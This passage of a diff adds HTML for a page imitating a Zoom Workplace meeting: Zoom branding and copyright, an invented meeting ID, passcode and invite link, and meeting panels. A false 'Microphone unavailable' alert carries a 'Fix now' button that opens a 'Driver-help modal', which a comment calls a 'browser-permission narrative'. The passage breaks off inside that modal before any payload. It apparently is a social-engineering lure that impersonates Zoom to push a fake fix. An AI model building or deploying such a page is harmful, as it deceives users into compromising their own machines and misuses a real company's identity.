+      <p class="terms-text">By clicking "Join", you agree to our <a href="https://app.zoom.us/terms" target="_blank" rel="noopener noreferrer">Terms of Service</a> and <a href="https://app.zoom.us/privacy" target="_blank" rel="noopener noreferrer">Privacy Statement</a>.</p>
+      <p class="recaptcha-text">Zoom is protected by reCAPTCHA and their <a href="https://app.zoom.us/privacy" target="_blank" rel="noopener noreferrer">Privacy Policy</a> and <a href="https://app.zoom.us/terms" target="_blank" rel="noopener noreferrer">Terms of Service</a> apply.</p>
+    </div>
+  </div>
+  <div class="footer">© 2026 Zoom Communications, Inc. All rights reserved. <a>Privacy &amp; Legal Policies</a> &nbsp;|&nbsp; <a>Send Report</a></div>
+</div>
+
+<div class="screen" id="loading2"><div style="display:flex;flex-direction:column;align-items:center;"><div class="spinner"></div><div class="loading-text">Joining Meeting...</div></div></div>
+
+<div class="screen" id="meeting">
+  <div class="app">
+    <div class="meeting-col">
+
+      <div class="topbar">
+        <div class="brand"><span class="b1">Zoom</span><span class="b2">Workplace</span></div>
+        <div class="top-right">
+          <div class="shield-btn" id="shieldBtn" title="Meeting information">
+            <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.269 4.139c-.202-.005-.386.138-.405.34-.633 6.71 3.331 9.73 6.145 10.51.025.006.05.006.075 0 2.814-.78 6.778-3.8 6.145-10.51-.019-.202-.203-.345-.405-.34-2.23.056-4.608-2.006-5.455-2.818a.491.491 0 0 0-.645 0c-.848.812-3.225 2.874-5.455 2.818Zm9.323 2.764a.65.65 0 0 0-.947-.89L7.123 9.758 5.989 8.505a.65.65 0 1 0-.964.873l1.607 1.774a.65.65 0 0 0 .955.01l4.005-4.259Z" fill="#25E55F"></path></svg>
+          </div>
+          <span class="vdiv"></span>
+          <div class="view-btn" id="viewBtn"><svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M3.75 1.5A.75.75 0 0 0 3 .75H1.5a.75.75 0 0 0-.75.75V3c0 .414.336.75.75.75H3A.75.75 0 0 0 3.75 3V1.5Zm3.75 0a.75.75 0 0 0-.75-.75h-1.5a.75.75 0 0 0-.75.75V3c0 .414.336.75.75.75h1.5A.75.75 0 0 0 7.5 3V1.5Zm.75 0A.75.75 0 0 1 9 .75h1.5a.75.75 0 0 1 .75.75V3a.75.75 0 0 1-.75.75H9A.75.75 0 0 1 8.25 3V1.5Zm3 3.75a.75.75 0 0 0-.75-.75h-9a.75.75 0 0 0-.75.75v5.25c0 .414.336.75.75.75h9a.75.75 0 0 0 .75-.75V5.25Z" fill="#fff"/></svg><span>View</span></div>
+          <div class="mt-circle" aria-hidden="true"><span class="mt-icon">ZM</span></div>
+        </div>
+      </div>
+
+      <div class="stage" id="stage">
+        <div class="gallery" id="gallery"></div>
+        <div class="speaker" id="speaker"><div class="filmstrip" id="filmstrip"></div><div class="main-speaker" id="mainSpeaker"><button class="remove-pin" id="removePin" type="button">Remove Pin</button></div></div>
+        <div class="reaction-layer" id="reactionLayer"></div>
+
+        <div class="notification-message-wrap" id="notif">
+          <div class="notification-message-wrap__layer">
+            <div class="notification-message-wrap__txt-container" aria-live="polite" aria-atomic="true">
+              <span class="notification-message-wrap__txt">
+                <span style="margin-right:10px;display:flex;">
+                  <svg width="14" height="13" viewBox="0 0 14 13" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M.257 10.765A1.5 1.5 0 0 0 1.565 13h10.87a1.5 1.5 0 0 0 1.307-2.235L8.308 1.102a1.5 1.5 0 0 0-2.614 0L.257 10.765ZM6.35 7.6V4.65a.65.65 0 0 1 1.3 0V7.6a.65.65 0 0 1-1.3 0Zm-.1 2.65a.75.75 0 1 1 1.5 0 .75.75 0 0 1-1.5 0Z" fill="#FAAC2A"></path></svg>
+                </span>
+                <span>Microphone unavailable. Other participants can't hear you. <button id="drvOpen" style="margin:0 3px;color:rgb(13,110,253);text-decoration:underline;background:none;border:none;cursor:pointer;font-size:16px;font-family:var(--font);padding:0;">Fix now</button></span>
+              </span>
+              <i role="button" tabindex="0" class="notification-message-wrap__close" aria-label="close" id="notifClose"></i>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="toolbar">
+        <div class="tb-left">
+          <div class="tool" id="tAudio">
+            <span class="tool-chev"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.816 10.172a.6.6 0 0 1-.849-.016L8 7.006l-2.968 3.15a.6.6 0 1 1-.864-.832l3.4-3.6a.6.6 0 0 1 .864 0l3.4 3.6a.6.6 0 0 1-.016.848Z" fill="#fff" opacity="0.5"/></svg></span>
+            <div class="ic" id="micIc"></div>Audio
+          </div>
+          <div class="tool" id="tVideo">
+            <span class="tool-chev"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.816 10.172a.6.6 0 0 1-.849-.016L8 7.006l-2.968 3.15a.6.6 0 1 1-.864-.832l3.4-3.6a.6.6 0 0 1 .864 0l3.4 3.6a.6.6 0 0 1-.016.848Z" fill="#fff" opacity="0.5"/></svg></span>
+            <div class="ic" id="camIc"></div>Video
+          </div>
+        </div>
+
+        <div class="tb-center">
+          <div class="tool" id="tParticipants">
+            <div class="badge"><span class="count" id="pCount">2</span><svg width="13" height="13" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.816 10.172a.6.6 0 0 1-.849-.016L8 7.006l-2.968 3.15a.6.6 0 1 1-.864-.832l3.4-3.6a.6.6 0 0 1 .864 0l3.4 3.6a.6.6 0 0 1-.016.848Z" fill="#fff" opacity="0.5"/></svg></div>
+            <div class="ic"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M6.75 6.75a1.5 1.5 0 1 1 3 0 1.5 1.5 0 0 1-3 0Zm1.5-3a3 3 0 1 0 0 6 3 3 0 0 0 0-6Zm6 6a1.5 1.5 0 1 1 3 0 1.5 1.5 0 0 1-3 0Zm1.5-3a3 3 0 1 0 0 6 3 3 0 0 0 0-6ZM3 15.75a4.5 4.5 0 0 1 4.5-4.5H9c1.259 0 2.398.518 3.214 1.35a.75.75 0 1 1-1.072 1.05A2.989 2.989 0 0 0 9 12.75H7.5a3 3 0 0 0-3 3V18A1.5 1.5 0 0 0 6 19.5h3A.75.75 0 0 1 9 21H6a3 3 0 0 1-3-3v-2.25Zm11.531-1.5a4.031 4.031 0 0 0-4.031 4.031A2.719 2.719 0 0 0 13.219 21h5.062A2.719 2.719 0 0 0 21 18.281a4.031 4.031 0 0 0-4.031-4.031H14.53ZM12 18.281a2.531 2.531 0 0 1 2.531-2.531h2.438a2.531 2.531 0 0 1 2.531 2.531c0 .673-.546 1.219-1.219 1.219H13.22A1.219 1.219 0 0 1 12 18.281Z" fill="#fff"/></svg></div>Participants
+          </div>
+          <div class="tool" id="tChat">
+            <span class="tool-chev"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.816 10.172a.6.6 0 0 1-.849-.016L8 7.006l-2.968 3.15a.6.6 0 1 1-.864-.832l3.4-3.6a.6.6 0 0 1 .864 0l3.4 3.6a.6.6 0 0 1-.016.848Z" fill="#fff" opacity="0.5"/></svg></span>
+            <div class="ic"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M9.297 9.5c-1.718 0-3.31.207-4.588.451-1.46.279-2.459 1.62-2.459 3.22V17A3.75 3.75 0 0 0 6 20.75h2.02l.168.52c.163.508.215 1.15.024 1.724a3.481 3.481 0 0 1-.057.158c1.015-.33 2.113-.945 2.863-2.068l.222-.334h1.51A3.75 3.75 0 0 0 16.5 17v-3.8c0-1.656-1.072-3.042-2.604-3.299A28.172 28.172 0 0 0 9.297 9.5Zm-4.87-1.022A26.213 26.213 0 0 1 9.297 8c1.8 0 3.484.194 4.846.422C16.498 8.816 18 10.916 18 13.2V17c0 2.9-2.35 5.25-5.25 5.25h-.723c-1.71 2.235-4.425 2.682-5.672 2.747a.812.812 0 0 1-.842-.64.818.818 0 0 1 .454-.907 1.48 1.48 0 0 0 .821-.93.983.983 0 0 0 .045-.27H6A5.25 5.25 0 0 1 .75 17v-3.829c0-2.202 1.401-4.259 3.678-4.693Z" fill="#fff"/><path fill-rule="evenodd" clip-rule="evenodd" d="M9.209 4.701a24.715 24.715 0 0 1 4.588-.451c1.696 0 3.295.183 4.599.401C19.928 4.908 21 6.294 21 7.951v3.799a3.74 3.74 0 0 1-1.18 2.73.958.958 0 0 0-.32.689c0 .615.64 1.007 1.113.612A5.24 5.24 0 0 0 22.5 11.75v-3.8c0-2.284-1.502-4.384-3.857-4.778a29.67 29.67 0 0 0-4.846-.422c-1.834 0-3.523.22-4.87.478-1.475.282-2.583 1.245-3.18 2.488-.238.496.196.994.744.936a.963.963 0 0 0 .712-.489c.429-.752 1.136-1.296 2.006-1.462ZM6.75 15.125a1.125 1.125 0 1 1-2.25 0 1.125 1.125 0 0 1 2.25 0Zm3.75 0a1.125 1.125 0 1 1-2.25 0 1.125 1.125 0 0 1 2.25 0Zm2.625 1.125a1.125 1.125 0 1 0 0-2.25 1.125 1.125 0 0 0 0 2.25Z" fill="#fff"/></svg></div>Chat
+          </div>
+          <div class="tool" id="tReact">
+            <div class="ic"><svg viewBox="0 0 26 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M10.226 22.043a1.5 1.5 0 0 1-1.696-.471c-1.189-1.479-2.9-4.056-5.134-7.425l-.741-1.116C.841 10.3.311 7.567 1.195 5.285 2.082 2.993 4.226 1.6 6.797 1.201c2.242-.348 4.194.842 5.454 1.925a12.537 12.537 0 0 1 1.615 1.68l.004.006.007-.003a12.137 12.137 0 0 1 2.221-.615c1.621-.282 3.892-.3 5.656 1.161 2.024 1.675 3.188 3.987 2.825 6.425-.36 2.427-2.165 4.512-5.075 5.93l-1.19.58c-3.588 1.752-6.334 3.092-8.089 3.753Zm4.493-15.935c-.683.238-1.183.49-1.355.622-.084-.203-.39-.68-.863-1.238-1.133-1.34-3.217-3.152-5.46-2.804-4.39.681-6.434 4.565-3.146 9.516l.723 1.088c2.26 3.406 3.928 5.92 5.07 7.34 1.686-.634 4.365-1.941 7.994-3.712l1.16-.565c5.276-2.572 5.425-6.982 1.97-9.842-1.764-1.461-4.456-.975-6.093-.405Z" fill="#fff"/></svg></div>React
+          </div>
+          <div class="tool" id="tShare">
+            <div class="ic"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M24 18.75V5.25a3 3 0 0 0-3-3H3a3 3 0 0 0-3 3v13.5a3 3 0 0 0 3 3h18a3 3 0 0 0 3-3ZM7.758 13.32a.69.69 0 0 0 1.009 0l1.807-1.915v5.849c0 .412.32.746.713.746h1.426c.394 0 .713-.334.713-.746v-5.85l1.807 1.917a.691.691 0 0 0 1.009 0l1.008-1.056a.77.77 0 0 0 0-1.055L12.504 6.22a.69.69 0 0 0-1.008 0L6.75 11.21a.77.77 0 0 0 0 1.055l1.008 1.056Z" fill="#00FF91"/></svg></div>Share
+          </div>
+          <div class="tool inactive" id="tAi" title="AI Companion (visual only)">
+            <div class="ic"><svg viewBox="4 1 21 18" xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="aiGrad" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#ffffff"/><stop offset=".5" stop-color="#d4e9fb"/><stop offset="1" stop-color="#86b8ee"/></linearGradient></defs><path fill="url(#aiGrad)" d="M11.5 2.6a.55.55 0 0 1 1.04 0l1.3 3.86a3 3 0 0 0 1.9 1.9l3.86 1.3a.55.55 0 0 1 0 1.04l-3.86 1.3a3 3 0 0 0-1.9 1.9l-1.3 3.86a.55.55 0 0 1-1.04 0l-1.3-3.86a3 3 0 0 0-1.9-1.9l-3.86-1.3a.55.55 0 0 1 0-1.04l3.86-1.3a3 3 0 0 0 1.9-1.9l1.3-3.86Z"/><path fill="url(#aiGrad)" d="M18.7 2.2a.4.4 0 0 1 .76 0l.62 1.85c.14.42.47.75.89.89l1.85.62a.4.4 0 0 1 0 .76l-1.85.62a1.4 1.4 0 0 0-.89.89l-.62 1.85a.4.4 0 0 1-.76 0l-.62-1.85a1.4 1.4 0 0 0-.89-.89l-1.85-.62a.4.4 0 0 1 0-.76l1.85-.62c.42-.14.75-.47.89-.89l.62-1.85Z"/></svg></div>AI Companion
+          </div>
+          <div class="tool" id="tMore">
+            <div class="ic"><svg viewBox="0 0 24 25" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="0.75" y="1.75" width="22.5" height="22.5" rx="11.25" stroke="#fff" stroke-width="1.5"/><path d="M7.5 13a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0ZM13.5 13a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0ZM18 14.5a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z" fill="#fff"/></svg></div>More
+          </div>
+        </div>
+
+        <div class="tb-right">
+          <div class="tool leave" id="tLeave">
+            <div class="ic"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M9.75 0a.75.75 0 0 0 0 1.5H21.5l-4.636 2.782a.75.75 0 0 0-.364.643v17.75a.75.75 0 0 0 1.136.643l6-3.6a.75.75 0 0 0 .364-.643V1.325a.743.743 0 0 0-.114-.4A1.5 1.5 0 0 0 22.5 0H9.75ZM22.5 18.65v-16L18 5.35v16l4.5-2.7Z" fill="#FF0055"/><path fill-rule="evenodd" clip-rule="evenodd" d="m10.51 12.903-.581-1.745-.053-.01-1.472 3.826 1.607 1.33a1.5 1.5 0 0 1 .524.918v.001l.706 4.409a.75.75 0 0 1-1.482.236l-.705-4.408-3.18-2.632A.75.75 0 0 1 5.646 14l.899-3.458-.034-.006L5 11.399l-1.409 1.812a.75.75 0 0 1-1.184-.921l1.409-1.812a1.5 1.5 0 0 1 .44-.381l1.509-.863a1.502 1.502 0 0 1 1.012-.173l3.42.622a1.5 1.5 0 0 1 1.154 1v.001l.554 1.66 1.374 1.375a.75.75 0 1 1-1.06 1.06l-1.438-1.436a1.111 1.111 0 0 1-.271-.44Zm2.707-1.368-.442-1.325a3 3 0 0 0-1.154-1.529A3.75 3.75 0 1 0 5.64 7.665a2.999 2.999 0 0 0-.618.267l-1.508.862a3 3 0 0 0-.88.763L1.224 11.37a2.25 2.25 0 0 0 2.75 3.41l-1.121 3.633-1.581 1.898a2.25 2.25 0 1 0 3.457 2.88l1.824-2.189c.227-.273.397-.589.498-.929l.593-1.832.018.015.616 3.85a2.25 2.25 0 0 0 4.444-.71l-.706-4.409a3 3 0 0 0-.195-.686 2.25 2.25 0 0 0 2.52-3.641l-1.124-1.124Zm-6.707 5.34-1.267-1.12-1.046 3.387-1.773 2.128a.75.75 0 0 0 1.152.96L5.4 20.04a1.124 1.124 0 0 0 .218-.411l.892-2.755ZM9.83 8.091A2.25 2.25 0 1 0 8.167 3.91a2.25 2.25 0 0 0 1.664 4.183Z" fill="#fff"/></svg></div>Leave
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <aside class="side-panel" id="chatPanel">
+      <div class="panel-inner">
+        <div class="panel-head">
+          <span class="chat-head-icon"><svg width="14" height="15" viewBox="0 0 14 15" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M7.875 1.375c.482 0 .875.393.875.875v3.5a.876.876 0 0 1-.875.875H5.099c-.584 0-1.134.228-1.547.64l-.927.928V7.5a.875.875 0 0 0-.875-.875.876.876 0 0 1-.875-.875v-3.5c0-.482.393-.875.875-.875h6.125Zm0-.875H1.75A1.75 1.75 0 0 0 0 2.25v3.5C0 6.716.783 7.5 1.75 7.5v1.75a.437.437 0 0 0 .747.308L4.17 7.884c.246-.246.58-.384.928-.384h2.776a1.75 1.75 0 0 0 1.75-1.75v-3.5A1.75 1.75 0 0 0 7.875.5Zm4.375 4.813h-1.313a.437.437 0 1 0 0 .875h1.313c.483 0 .875.391.875.875v3.535c0 .484-.408.83-.893.84a.875.875 0 0 0-.857.874v.693l-.927-.927c-.41-.41-.967-.64-1.547-.64H6.125a.875.875 0 0 1-.875-.876V9.197a.437.437 0 1 0-.875 0v1.366c0 .966.783 1.75 1.75 1.75h2.776c.348 0 .682.138.928.384l1.674 1.674a.437.437 0 0 0 .747-.31v-1.748a1.75 1.75 0 0 0 1.75-1.75v-3.5a1.75 1.75 0 0 0-1.75-1.75Z" fill="#0E72ED"></path></svg></span>
+          <span class="panel-title center" id="chatTitle">Meeting</span>
+          <span class="panel-act">
+            <svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M10 1a1 1 0 0 0 0 2h1.586L6.293 8.293a1 1 0 0 0 1.414 1.414L13 4.414V6a1 1 0 1 0 2 0V2a1 1 0 0 0-1-1h-4Z" fill="#6E7680"/><path d="M3.001 5.001a2 2 0 0 1 2-2H6.5a1 1 0 0 0 0-2H5.001a4 4 0 0 0-4 4v6a4 4 0 0 0 4 4h6a4 4 0 0 0 4-4L15 9.5a1 1 0 1 0-2 0V11a2 2 0 0 1-2 2.001H5.001a2 2 0 0 1-2-2v-6Z" fill="#6E7680"/></svg>
+            <svg class="closePanel" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M3.707 2.293a1 1 0 0 0-1.414 1.414L6.586 8l-4.293 4.293a1 1 0 1 0 1.414 1.414L8 9.414l4.293 4.293a1 1 0 0 0 1.414-1.414L9.414 8l4.293-4.293a1 1 0 0 0-1.414-1.414L8 6.586 3.707 2.293Z" fill="#6E7680"/></svg>
+          </span>
+        </div>
+        <div class="chat-pmc">Messages addressed to "Meeting Group Chat" will also appear in the meeting group chat.</div>
+        <div class="chat-messages" id="chatMessages"></div>
+        <div class="chat-footer">
+          <button class="who-see"><svg viewBox="0 0 20 20"><path d="M7.5 9.5a3 3 0 1 0 0-6 3 3 0 0 0 0 6Z" fill="currentColor"/><path d="M1.8 16.5c0-2.8 2.6-4.8 5.7-4.8 1 0 1.9.2 2.7.55-.95.85-1.55 2.05-1.55 3.35 0 .3.02.6.07.9H1.8Z" fill="currentColor"/><path d="M14.6 10.1l3.4 1.15v2.05c0 1.75-1.45 2.75-3.4 3.4-1.95-.65-3.4-1.65-3.4-3.4v-2.05l3.4-1.15Z" fill="#2f80ed" stroke="#2b2c30" stroke-width="1.2"/></svg>Who can see your messages?</button>
+          <div class="to-row">to: <span class="to-pill">Meeting Group Chat</span></div>
+          <textarea class="chat-input" id="chatInput" placeholder="Type message here ..." rows="1"></textarea>
+          <div class="chat-tools">
+            <svg fill="none" viewBox="0 0 16 16"><path stroke="currentColor" d="m12.682 5.258 1.091 1.128a.757.757 0 0 1-.013 1.066L8.338 12.78a.757.757 0 0 1-.402.206l-2.038.351a.212.212 0 0 1-.246-.243l.344-2.13a.757.757 0 0 1 .217-.419l5.394-5.302a.757.757 0 0 1 1.075.014Z"/><path fill="currentColor" fill-rule="evenodd" d="M2.5 2a.5.5 0 0 0 0 1h2.25v5.5c0 .078.093.095.14.034l.704-.905c.101-.13.156-.29.156-.454V3H8a.5.5 0 0 0 0-1H2.5Z" clip-rule="evenodd"/></svg>
+            <svg viewBox="0 0 12 14" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M1 11V3a2 2 0 0 1 2-2h4v2.5A1.5 1.5 0 0 0 8.5 5H11v6a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2Zm9.586-7L8 1.414V3.5a.5.5 0 0 0 .5.5h2.086ZM0 3v8a3 3 0 0 0 3 3h6a3 3 0 0 0 3-3V4.828a2 2 0 0 0-.586-1.414L8.586.586A2 2 0 0 0 7.172 0H3a3 3 0 0 0-3 3Z" fill="currentColor"/></svg>
+            <svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M8 14A6 6 0 1 0 8 2a6 6 0 0 0 0 12Zm0 1A7 7 0 1 0 8 1a7 7 0 0 0 0 14ZM6 8a1 1 0 1 0 0-2 1 1 0 0 0 0 2Zm4 0a1 1 0 1 0 0-2 1 1 0 0 0 0 2ZM5.657 9.253a.5.5 0 1 0-.87.494C5.54 11.073 7.016 11.5 8 11.5s2.46-.427 3.213-1.753a.5.5 0 0 0-.87-.494C9.831 10.154 8.775 10.5 8 10.5c-.775 0-1.831-.346-2.343-1.247Z" fill="currentColor"/></svg>
+            <span class="spacer"></span>
+            <span class="send"><svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M14.459 1.009 1.235 1C.077 1-.442 2.477.454 3.224L3.746 5.97a1.62 1.62 0 0 0 1.555.294l3.494-1.172c.443-.149.748.451.372.734l-2.96 2.223c-.452.34-.702.89-.664 1.461l.295 4.322c.08 1.176 1.565 1.6 2.235.638l7.641-10.987c.722-1.037-.006-2.472-1.255-2.473Z" fill="currentColor"/></svg></span>
+          </div>
+        </div>
+      </div>
+    </aside>
+
+    <aside class="side-panel" id="participantsPanel">
+      <div class="panel-inner">
+        <div class="panel-head">
+          <span class="head-spacer"></span>
+          <span class="panel-title center" id="partTitle">Participants</span>
+          <span class="panel-act">
+            <svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M10 1a1 1 0 0 0 0 2h1.586L6.293 8.293a1 1 0 0 0 1.414 1.414L13 4.414V6a1 1 0 1 0 2 0V2a1 1 0 0 0-1-1h-4Z" fill="#6E7680"/><path d="M3.001 5.001a2 2 0 0 1 2-2H6.5a1 1 0 0 0 0-2H5.001a4 4 0 0 0-4 4v6a4 4 0 0 0 4 4h6a4 4 0 0 0 4-4L15 9.5a1 1 0 1 0-2 0V11a2 2 0 0 1-2 2.001H5.001a2 2 0 0 1-2-2v-6Z" fill="#6E7680"/></svg>
+            <svg class="closePanel" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M3.707 2.293a1 1 0 0 0-1.414 1.414L6.586 8l-4.293 4.293a1 1 0 1 0 1.414 1.414L8 9.414l4.293 4.293a1 1 0 0 0 1.414-1.414L9.414 8l4.293-4.293a1 1 0 0 0-1.414-1.414L8 6.586 3.707 2.293Z" fill="#6E7680"/></svg>
+          </span>
+        </div>
+        <div class="p-list" id="pList"></div>
+        <div class="participants-footer"><button class="pf-btn">Invite</button><button class="pf-btn">Mute</button></div>
+      </div>
+    </aside>
+
+  </div>
+
+  <div class="popover react-pop" id="reactPop">
+    <div class="emoji-row">
+      <button data-e="👏">👏</button><button data-e="👍">👍</button><button data-e="😂">😂</button><button data-e="😮">😮</button><button data-e="❤️">❤️</button><button data-e="🎉">🎉</button><button class="more-emoji">⋯</button>
+    </div>
+    <div class="status-row">
+      <button class="st green">✓</button><button class="st red">✕</button><button class="st">«</button><button class="st blue">»</button><button class="st">☕</button>
+    </div>
+    <button class="wide-btn" id="raiseHand">✋&nbsp; Raise Hand</button>
+    <button class="wide-btn">⌛&nbsp; Be right back</button>
+  </div>
+
+  <div class="popover more-pop" id="morePop">
+    <div class="m-item selected"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="6" width="18" height="12" rx="2"/><path d="M7 11h2M7 14h6" stroke-linecap="round"/></svg>Captions</div>
+    <div class="m-item has-sub"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="13" rx="2"/><path d="M8 21h8M12 17v4"/></svg>Whiteboards<span class="caret">▶</span>
+      <div class="submenu"><div class="m-item">Existing whiteboards</div><div class="m-item">New whiteboard</div></div>
+    </div>
+    <div class="m-sep"></div>
+    <div class="m-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.6 1.6 0 0 0 .3 1.8l.1.1a2 2 0 1 1-2.8 2.8l-.1-.1a1.6 1.6 0 0 0-1.8-.3 1.6 1.6 0 0 0-1 1.5V21a2 2 0 1 1-4 0v-.1a1.6 1.6 0 0 0-1-1.5 1.6 1.6 0 0 0-1.8.3l-.1.1a2 2 0 1 1-2.8-2.8l.1-.1a1.6 1.6 0 0 0 .3-1.8 1.6 1.6 0 0 0-1.5-1H3a2 2 0 1 1 0-4h.1a1.6 1.6 0 0 0 1.5-1 1.6 1.6 0 0 0-.3-1.8l-.1-.1a2 2 0 1 1 2.8-2.8l.1.1a1.6 1.6 0 0 0 1.8.3H9a1.6 1.6 0 0 0 1-1.5V3a2 2 0 1 1 4 0v.1a1.6 1.6 0 0 0 1 1.5 1.6 1.6 0 0 0 1.8-.3l.1-.1a2 2 0 1 1 2.8 2.8l-.1.1a1.6 1.6 0 0 0-.3 1.8V9a1.6 1.6 0 0 0 1.5 1H21a2 2 0 1 1 0 4h-.1a1.6 1.6 0 0 0-1.5 1z"/></svg>Settings</div>
+    <div class="m-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="6" width="14" height="12" rx="2"/><path d="m22 8-6 4 6 4z"/><path d="m6 9 4 3-4 3"/></svg>Stop Incoming Video</div>
+    <div class="m-sep"></div>
+    <div class="m-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 0 1 15-6.7L21 8"/><path d="M21 3v5h-5"/><path d="M21 12a9 9 0 0 1-15 6.7L3 16"/><path d="M3 21v-5h5"/></svg>Reset to default</div>
+  </div>
+
+  <div class="info-panel" id="infoPanel">
+    <h2 id="infoTitle">Meeting</h2>
+    <div class="info-grid">
+      <div class="il">Meeting ID</div><div class="iv">842 9571 0036</div>
+      <div class="il">Host</div><div class="iv" id="infoHost">Participant 1</div>
+      <div class="il">Passcode</div><div class="iv">zR7kPq</div>
+      <div class="il">Numeric Password<br>Telephone/Room Systems</div><div class="iv">519274</div>
+      <div class="il">Invite Link</div><div class="iv"><div class="invite-url" id="inviteUrl">https://app.zoom.us/j/84295710036?pwd=Xk2vTbZr9q</div><button class="copy-link" id="copyLink"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>Copy Link</button></div>
+      <div class="il">Participant ID</div><div class="iv">274813</div>
+      <div class="il">Encryption</div><div class="iv">Enabled</div>
+    </div>
+    <p class="info-note">You are connected to the Zoom Global Network via a data center in the United States.</p>
+    <div class="info-report">Report 🚩</div>
+  </div>
+
+  <div class="view-menu" id="viewMenu">
+    <div class="vm-item" data-view="speaker"><span class="vm-check">✓</span><span class="vm-label">Speaker View</span><span class="vm-ic"><svg viewBox="0 0 24 24" fill="currentColor"><rect x="3" y="8.5" width="18" height="11" rx="1.5"/><rect x="4.5" y="4.5" width="4" height="2.6" rx=".6"/><rect x="10" y="4.5" width="4" height="2.6" rx=".6"/><rect x="15.5" y="4.5" width="4" height="2.6" rx=".6"/></svg></span></div>
+    <div class="vm-item" data-view="gallery"><span class="vm-check"></span><span class="vm-label">Gallery View</span><span class="vm-ic"><svg viewBox="0 0 24 24" fill="currentColor"><rect x="4" y="4" width="4" height="4" rx="1"/><rect x="10" y="4" width="4" height="4" rx="1"/><rect x="16" y="4" width="4" height="4" rx="1"/><rect x="4" y="10" width="4" height="4" rx="1"/><rect x="10" y="10" width="4" height="4" rx="1"/><rect x="16" y="10" width="4" height="4" rx="1"/><rect x="4" y="16" width="4" height="4" rx="1"/><rect x="10" y="16" width="4" height="4" rx="1"/><rect x="16" y="16" width="4" height="4" rx="1"/></svg></span></div>
+    <div class="vm-item" data-view="multi"><span class="vm-check"></span><span class="vm-label">Multi-speaker View</span><span class="vm-ic"><svg viewBox="0 0 24 24" fill="currentColor"><rect x="4" y="4" width="7" height="7" rx="1.2"/><rect x="13" y="4" width="7" height="7" rx="1.2"/><rect x="4" y="13" width="7" height="7" rx="1.2"/><rect x="13" y="13" width="7" height="7" rx="1.2"/></svg></span></div>
+    <div class="vm-sep"></div>
+    <div class="vm-item disabled"><span class="vm-check"></span><span class="vm-label">Sort Gallery By</span><span class="vm-ic">›</span></div>
+    <div class="vm-sep"></div>
+    <div class="vm-item disabled"><span class="vm-check"></span><span class="vm-label">Hide Self View</span></div>
+    <div class="vm-item disabled"><span class="vm-check"></span><span class="vm-label">Hide Non-video Participants</span></div>
+    <div class="vm-sep"></div>
+    <div class="vm-item disabled"><span class="vm-check"></span><span class="vm-label">Fullscreen</span></div>
+  </div>
+
+  <!-- Driver-help modal — dark-theme browser-permission narrative -->
+  <div class="drv-overlay" id="drvOverlay">
+    <div class="drv-modal">
+      <button class="drv-close" id="drvClose" aria-label="Close">&times;</button>
+      <div class="drv-icon-wrap">
+        <div class="drv-icon-mic">
